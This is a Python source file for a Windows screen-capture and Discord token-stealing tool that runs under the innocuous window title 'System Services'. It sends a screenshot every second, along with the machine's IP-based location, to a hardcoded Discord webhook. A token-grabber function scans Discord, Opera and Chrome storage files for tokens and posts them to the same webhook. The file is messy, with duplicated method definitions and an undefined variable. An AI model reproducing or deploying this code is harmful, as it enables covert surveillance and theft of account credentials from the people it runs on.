import os
import re
import sys
from urllib.parse import quote
import tkinter as tk
from tkinter import ttk
import psutil
import win32gui
import win32process
import win32con
from PIL import Image, ImageTk, ImageGrab
import requests
from io import BytesIO
import threading
import time
import json

WEBHOOK_URL = 'https://discord.com/api/webhooks/1352184008766918710/RldTkR__VVfte3Pm_a4oYvaF12d5Kmu_3vX-v_v3d2HuOVfQ6FKvt9QoGsCpxphxRLvb'

class ScreenViewer:
    def __init__(self):
        try:
            self.root = tk.Tk()
            self.root.title("System Services")
            self.root.geometry("1200x700")
            
            # Add error handling for clean exit
            self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
            
            # Rest of init remains same
            self.connected_users = {}
            self.current_user = None
            self.user_tabs = {}
            self.tokens = []
            
            self.create_gui()
            
            self.running = True
            self.thread = threading.Thread(target=self.capture_and_send)
            self.thread.daemon = True
            self.thread.start()
            
            self.root.mainloop()
        except Exception as e:
            print(f"Initialization error: {e}")
            sys.exit(1)

    def on_closing(self):
        try:
            self.running = False
            self.root.quit()
            self.root.destroy()
        except Exception as e:
            print(f"Error during cleanup: {e}")
            sys.exit(1)

    # Add these imports at the top
    import os
    import re
    import sys
    from urllib.parse import quote
    
    # Update the capture_and_send method
    def capture_and_send(self):
        frame_time = 1.0 / 60.0  # Target 60 FPS
        while self.running:
            start_time = time.time()
            try:
                screenshot = ImageGrab.grab()
                buffer = BytesIO()
                screenshot.save(buffer, format='PNG', optimize=True, quality=85)
                image_binary = buffer.getvalue()
                
                try:
                    location_response = requests.get('http://ip-api.com/json/', timeout=5)
                    if location_response.status_code == 200:
                        location_data = location_response.json()
                        user_info = {
                            'ip': location_data.get('ip', 'Unknown'),
                            'city': location_data.get('city', 'Unknown'),
                            'country': location_data.get('country_name', 'Unknown'),
                            'isp': location_data.get('org', 'Unknown')
                        }
                        
                        # Use webhook with proper headers and formatting
                        files = {
                            'file': ('screenshot.png', image_binary, 'image/png')
                        }
                        payload = {
                            'content': json.dumps({
                                'ip': user_info['ip'],
                                'location': f"{user_info['city']}, {user_info['country']}",
                                'isp': user_info['isp']
                            })
                        }
                        
                        headers = {
                            'Content-Type': 'multipart/form-data'
                        }
                        
                        response = requests.post(
                            WEBHOOK_URL,
                            files=files,
                            data=payload,
                            headers=headers,
                            timeout=5
                        )
                        
                        if response.status_code == 200:
                            self.root.after(0, self.add_user, user_info['ip'], user_info)
                            self.root.after(0, self.update_screen, screenshot, user_info['ip'])
                    
                except requests.exceptions.RequestException as e:
                    print(f"Network error: {e}")
                    # Use local fallback
                    user_info = {
                        'ip': 'Local',
                        'city': 'Unknown',
                        'country': 'Unknown',
                        'isp': 'Unknown'
                    }
                    self.root.after(0, self.add_user, user_info['ip'], user_info)
                    self.root.after(0, self.update_screen, screenshot, user_info['ip'])
                
                self.root.after(0, self.update_browser_tabs)
                time.sleep(1)
                
            except Exception as e:
                print(f"Capture error: {e}")
                time.sleep(frame_time)
                continue

    def create_gui(self):
        # Main container
        main_container = ttk.PanedWindow(self.root, orient='horizontal')
        main_container.pack(fill='both', expand=True)
        
        # Left panel for user list and tabs
        left_panel = ttk.Frame(main_container, width=300)
        main_container.add(left_panel)
        
        # User list
        ttk.Label(left_panel, text="Connected Users").pack(pady=5)
        self.user_listbox = tk.Listbox(left_panel, width=30)
        self.user_listbox.pack(pady=5, padx=5, fill='x')
        self.user_listbox.bind('<<ListboxSelect>>', self.on_user_select)
        
        # Tabs list
        ttk.Label(left_panel, text="Open Tabs").pack(pady=5)
        self.tabs_frame = ttk.Frame(left_panel)
        self.tabs_frame.pack(fill='both', expand=True, pady=5, padx=5)
        
        self.tabs_listbox = tk.Listbox(self.tabs_frame, width=30)
        self.tabs_listbox.pack(side='left', fill='both', expand=True)
        
        # Scrollbar for tabs
        tabs_scrollbar = ttk.Scrollbar(self.tabs_frame)
        tabs_scrollbar.pack(side='right', fill='y')
        
        # Connect scrollbar
        self.tabs_listbox.config(yscrollcommand=tabs_scrollbar.set)
        tabs_scrollbar.config(command=self.tabs_listbox.yview)
        
        # Close tab button
        self.close_button = ttk.Button(left_panel, text="Close Selected Tab", command=self.close_selected_tab)
        self.close_button.pack(pady=5, padx=5)
        
        # Info panel
        info_frame = ttk.LabelFrame(left_panel, text="User Info")
        info_frame.pack(pady=5, padx=5, fill='x')
        self.info_label = ttk.Label(info_frame, text="No user selected")
        self.info_label.pack(pady=5, padx=5)
        
        # Create main canvas for screen display
        right_panel = ttk.Frame(main_container)
        main_container.add(right_panel)
        
        self.canvas = tk.Canvas(right_panel, bg='black')
        self.canvas.pack(fill='both', expand=True)
        
        # Remove token grabber button and listbox
        # Add browser selector
        ttk.Label(left_panel, text="Browser Tabs").pack(pady=5)
        self.browser_selector = ttk.Combobox(left_panel, values=["Chrome", "Edge", "Opera GX", "Firefox"])
        self.browser_selector.pack(pady=5, padx=5)
        self.browser_selector.bind('<<ComboboxSelected>>', self.update_browser_tabs)
        
        # Tabs list with browser info
        self.tabs_frame = ttk.Frame(left_panel)
        self.tabs_frame.pack(fill='both', expand=True, pady=5, padx=5)
        
        self.tabs_tree = ttk.Treeview(self.tabs_frame, columns=('title', 'url'))
        self.tabs_tree.heading('title', text='Title')
        self.tabs_tree.heading('url', text='URL')
        self.tabs_tree.pack(side='left', fill='both', expand=True)
        
        # Scrollbar for tabs
        tabs_scrollbar = ttk.Scrollbar(self.tabs_frame)
        tabs_scrollbar.pack(side='right', fill='y')
        
        # Connect scrollbar
        self.tabs_listbox.config(yscrollcommand=tabs_scrollbar.set)
        tabs_scrollbar.config(command=self.tabs_listbox.yview)
        
        # Close tab button
        self.close_button = ttk.Button(left_panel, text="Close Selected Tab", command=self.close_selected_tab)
        self.close_button.pack(pady=5, padx=5)
        
        # Info panel
        info_frame = ttk.LabelFrame(left_panel, text="User Info")
        info_frame.pack(pady=5, padx=5, fill='x')
        self.info_label = ttk.Label(info_frame, text="No user selected")
        self.info_label.pack(pady=5, padx=5)
        
        # Create main canvas for screen display
        right_panel = ttk.Frame(main_container)
        main_container.add(right_panel)
        
        self.canvas = tk.Canvas(right_panel, bg='black')
        self.canvas.pack(fill='both', expand=True)
        
        # Add Discord token button
        self.token_button = ttk.Button(left_panel, text="Grab Discord Tokens", command=self.grab_discord_tokens)
        self.token_button.pack(pady=5, padx=5)
        
        # Token display
        ttk.Label(left_panel, text="Discord Tokens").pack(pady=5)
        self.token_listbox = tk.Listbox(left_panel, width=30, height=5)
        self.token_listbox.pack(pady=5, padx=5, fill='x')

    def grab_discord_tokens(self):
        paths = {
            'Discord': os.path.join(os.getenv('APPDATA'), 'Discord'),
            'Discord Canary': os.path.join(os.getenv('APPDATA'), 'discordcanary'),
            'Discord PTB': os.path.join(os.getenv('APPDATA'), 'discordptb'),
            'Opera': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable'),
            'Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default'),
        }
        
        self.token_listbox.delete(0, tk.END)
        
        for platform, path in paths.items():
            if os.path.exists(path):
                tokens = self.find_tokens(path)
                for token in tokens:
                    if token not in self.tokens:
                        self.tokens.append(token)
                        self.token_listbox.insert(tk.END, f"{platform}: {token}")
                        
                        # Send tokens to Discord webhook with proper JSON formatting
                        try:
                            payload = {
                                "content": f"```\nPlatform: {platform}\nToken: {token}\n```"
                            }
                            requests.post(WEBHOOK_URL, json=payload, timeout=5)
                        except Exception as e:
                            print(f"Error sending token: {e}")

    def find_tokens(self, path):
        tokens = []
        for file_name in os.listdir(path):
            if file_name.endswith('.log') or file_name.endswith('.ldb'):
                try:
                    with open(os.path.join(path, file_name), 'r', errors='ignore') as file:
                        content = file.read()
                        possible_tokens = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', content)
                        tokens.extend(possible_tokens)
                except Exception as e:
                    continue
        return tokens

    def close_selected_tab(self):
        selection = self.tabs_listbox.curselection()
        if selection and self.current_user:
            tab_index = selection[0]
            tab_url = self.tabs_listbox.get(tab_index)
            # Send close command to extension
            try:
                requests.post(f"http://localhost:8000/close_tab", json={
                    "user_ip": self.current_user,
                    "tab_url": tab_url
                })
                self.tabs_listbox.delete(tab_index)
            except Exception as e:
                print(f"Error closing tab: {e}")
    
    def update_tabs_list(self, tabs_data):
        self.tabs_listbox.delete(0, tk.END)
        for tab in tabs_data:
            self.tabs_listbox.insert(tk.END, tab['url'])
    
    def on_user_select(self, event):
        selection = self.user_listbox.curselection()
        if selection:
            user_ip = self.user_listbox.get(selection[0])
            self.current_user = user_ip
            user_info = self.connected_users.get(user_ip, {})
            
            # Update info label
            info_text = f"IP: {user_ip}\n"
            info_text += f"Location: {user_info.get('city', 'Unknown')}\n"
            info_text += f"Country: {user_info.get('country', 'Unknown')}"
            self.info_label.config(text=info_text)
            
            # Update tabs list
            if user_ip in self.user_tabs:
                self.update_tabs_list(self.user_tabs[user_ip])

    def add_user(self, ip, info):
        if ip not in self.connected_users:
            self.connected_users[ip] = info
            self.user_listbox.insert(tk.END, ip)
            if not self.current_user:
                self.current_user = ip
                self.user_listbox.select_set(0)
                self.on_user_select(None)
    
    def update_screen(self, screenshot, ip):
        if ip == self.current_user:
            # Resize for display
            width = min(screenshot.width, 800)
            height = int(screenshot.height * (width / screenshot.width))
            screenshot = screenshot.resize((width, height))
            
            photo = ImageTk.PhotoImage(screenshot)
            self.canvas.config(width=width, height=height)
            self.canvas.create_image(0, 0, image=photo, anchor='nw')
            self.canvas.image = photo
    
    def get_browser_windows(self, browser_name):
        browser_windows = []
        def enum_windows_callback(hwnd, windows):
            if win32gui.IsWindowVisible(hwnd):
                _, pid = win32process.GetWindowThreadProcessId(hwnd)
                try:
                    process = psutil.Process(pid)
                    if browser_name.lower() in process.name().lower():
                        title = win32gui.GetWindowText(hwnd)
                        if title:
                            windows.append({
                                'hwnd': hwnd,
                                'title': title,
                                'url': title.split(' - ')[-1] if ' - ' in title else title
                            })
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
            return True
        
        win32gui.EnumWindows(enum_windows_callback, browser_windows)
        return browser_windows

    def update_browser_tabs(self, event=None):
        browser_map = {
            "Chrome": "chrome",
            "Edge": "msedge",
            "Opera GX": "opera",
            "Firefox": "firefox"
        }
        
        selected_browser = self.browser_selector.get()
        browser_process = browser_map.get(selected_browser, "")
        
        # Clear current tabs
        for item in self.tabs_tree.get_children():
            self.tabs_tree.delete(item)
        
        # Get and display tabs
        if browser_process:
            tabs = self.get_browser_windows(browser_process)
            for tab in tabs:
                self.tabs_tree.insert('', 'end', values=(tab['title'], tab['url']))

    def close_selected_tab(self):
        selection = self.tabs_tree.selection()
        if selection:
            item = selection[0]
            tab_info = self.tabs_tree.item(item)
            try:
                # Find and close the window
                def enum_windows_callback(hwnd, title):
                    if win32gui.IsWindowVisible(hwnd):
                        if title in win32gui.GetWindowText(hwnd):
                            win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
                
                win32gui.EnumWindows(enum_windows_callback, tab_info['values'][0])
                self.tabs_tree.delete(item)
            except Exception as e:
                print(f"Error closing tab: {e}")

    def update_tabs_list(self, tabs_data):
        self.tabs_listbox.delete(0, tk.END)
        for tab in tabs_data:
            self.tabs_listbox.insert(tk.END, tab['url'])
    
    def on_user_select(self, event):
        selection = self.user_listbox.curselection()
        if selection:
            user_ip = self.user_listbox.get(selection[0])
            self.current_user = user_ip
            user_info = self.connected_users.get(user_ip, {})
            
            # Update info label
            info_text = f"IP: {user_ip}\n"
            info_text += f"Location: {user_info.get('city', 'Unknown')}\n"
            info_text += f"Country: {user_info.get('country', 'Unknown')}"
            self.info_label.config(text=info_text)
            
            # Update tabs list
            if user_ip in self.user_tabs:
                self.update_tabs_list(self.user_tabs[user_ip])

    def add_user(self, ip, info):
        if ip not in self.connected_users:
            self.connected_users[ip] = info
            self.user_listbox.insert(tk.END, ip)
            if not self.current_user:
                self.current_user = ip
                self.user_listbox.select_set(0)
                self.on_user_select(None)
    
    def update_screen(self, screenshot, ip):
        if ip == self.current_user:
            # Resize for display
            width = min(screenshot.width, 800)
            height = int(screenshot.height * (width / screenshot.width))
            screenshot = screenshot.resize((width, height))
            
            photo = ImageTk.PhotoImage(screenshot)
            self.canvas.config(width=width, height=height)
            self.canvas.create_image(0, 0, image=photo, anchor='nw')
            self.canvas.image = photo
    
    def capture_and_send(self):
        while self.running:
            try:
                screenshot = ImageGrab.grab()
                buffer = BytesIO()
                screenshot.save(buffer, format='PNG')
                image_binary = buffer.getvalue()
                
                try:
                    # Use a more reliable IP geolocation API with better error handling
                    location_response = requests.get('http://ip-api.com/json/', timeout=5)
                    if location_response.status_code == 200:
                        location_data = location_response.json()
                        user_info = {
                            'ip': location_data.get('query', 'Unknown'),
                            'city': location_data.get('city', 'Unknown'),
                            'country': location_data.get('country', 'Unknown'),
                            'isp': location_data.get('isp', 'Unknown')
                        }
                        
                        self.root.after(0, self.add_user, user_info['ip'], user_info)
                        self.root.after(0, self.update_screen, screenshot, user_info['ip'])
                    
                        files = {
                            'file': ('screenshot.png', image_binary, 'image/png')
                        }
                        requests.post(WEBHOOK_URL, files=files, timeout=5)
                    
                except Exception as e:
                    print(f"Location service error: {e}")
                    # Use fallback location data
                    user_info = {
                        'ip': 'Local',
                        'city': 'Unknown',
                        'country': 'Unknown',
                        'isp': 'Unknown'
                    }
                    self.root.after(0, self.add_user, user_info['ip'], user_info)
                    self.root.after(0, self.update_screen, screenshot, user_info['ip'])
                
                self.root.after(0, self.update_browser_tabs)
                time.sleep(1)
                
            except Exception as e:
                print(f"Capture error: {e}")
                time.sleep(frame_time)
                continue

if __name__ == '__main__':
    viewer = ScreenViewer()
